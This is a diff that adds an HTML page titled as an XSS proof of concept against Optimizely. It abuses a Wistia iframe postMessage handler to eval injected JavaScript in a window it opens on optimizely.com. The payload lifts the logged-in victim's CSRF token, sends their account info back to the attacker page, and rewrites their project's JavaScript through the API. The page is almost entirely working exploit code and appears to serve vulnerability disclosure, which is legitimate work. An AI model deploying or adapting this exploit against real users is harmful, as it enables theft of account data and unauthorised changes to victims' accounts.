@@ -1,0 +1,94 @@
+<!doctype html>
+<html>
+<head>
+  <title>XSS Proof of Concept</title>
+</head>
+<body>
+  <p><b>WARNING:</b> To demonstrate account-modifying functionality, this link will attempt to add a comment to your primary project's Project Javascript. To disable this, delete lines 35-51.</p>
+  <p>Check <a target="_blank" id="victim-link">this</a> out!</p>
+  <div id='cookie'></div>
+  <script>
+  var target_url = "https://www.optimizely.com/products/experimentation/";
+  var cookie_string = "Your Optimizely info: ";
+
+  var payload = `
+  var csrfToken;
+  fetch(
+    "https://app.optimizely.com/",{
+      credentials: "include"
+    }).then(r => r.text())
+    .then(page => {
+      var csrfMatch = page.match(/"csrf": "([^"]+)"/)
+      if (!csrfMatch) {
+        window.opener.postMessage("${cookie_string}Looks like you're not logged in, sorry!","*");
+      } else {
+        csrfToken = csrfMatch[1];
+        fetch("https://app.optimizely.com/account/info",{
+          credentials: "include",
+          headers: {
+            'x-csrf-token': csrfToken
+          }
+        }).then(r => r.text())
+        .then(info => {
+          window.opener.postMessage("${cookie_string}"+info,"*");
+        });
+        fetch("https://app.optimizely.com/api/v1/projects",{
+          credentials: "include",
+          headers: {
+            'x-csrf-token': csrfToken
+          }
+        }).then(r => r.json())
+        .then(projs => {
+          var pid = projs[0].account_id;
+          var oldjs = projs[0].project_javascript;
+          fetch("https://app.optimizely.com/api/v1/projects/"+pid,{
+            method: "PUT",
+            body: JSON.stringify({id: pid, project_javascript:"/* added from www.optimizely.com */"+oldjs}),
+            credentials: "include",
+            headers: {
+              'x-csrf-token': csrfToken
+            }
+          });
+        });
+      }
+    })`;
+
+  function startInjecting(target,payload) {
+    var wrappedPayload = `(function(){if (!window.injected) {
+      window.injected = true;
+      window.opener.postMessage("you can stop now", "*");
+      ${payload}
+    }})()`
+    var t = setInterval(function() {
+      for (var i=0; i<50; i++) {
+        target.postMessage({
+          signature: "wistia-iframe-wistia_"+i,
+          method: 'iframe.ownerDocument.defaultView.eval',
+          args:[wrappedPayload]
+        },"*")
+      }
+    }, 10);
+    window.addEventListener('message', function(e) {
+      if (e.source === target && e.data === "you can stop now") {
+        clearInterval(t);
+      };
+    });
+  }
+
+  window.addEventListener('message', function(e) {
+    console.log("le message", e)
+    if (e.data.indexOf && e.data.indexOf(cookie_string) === 0) {
+      document.getElementById('cookie').innerText = e.data;
+    }
+  })
+
+  document.getElementById('victim-link').href = target_url;
+
+
+  document.getElementById('victim-link').addEventListener("click",function(e) {
+    e.preventDefault();
+    startInjecting(window.open(target_url), payload);
+  });
+  </script>
+</body>
+</html>
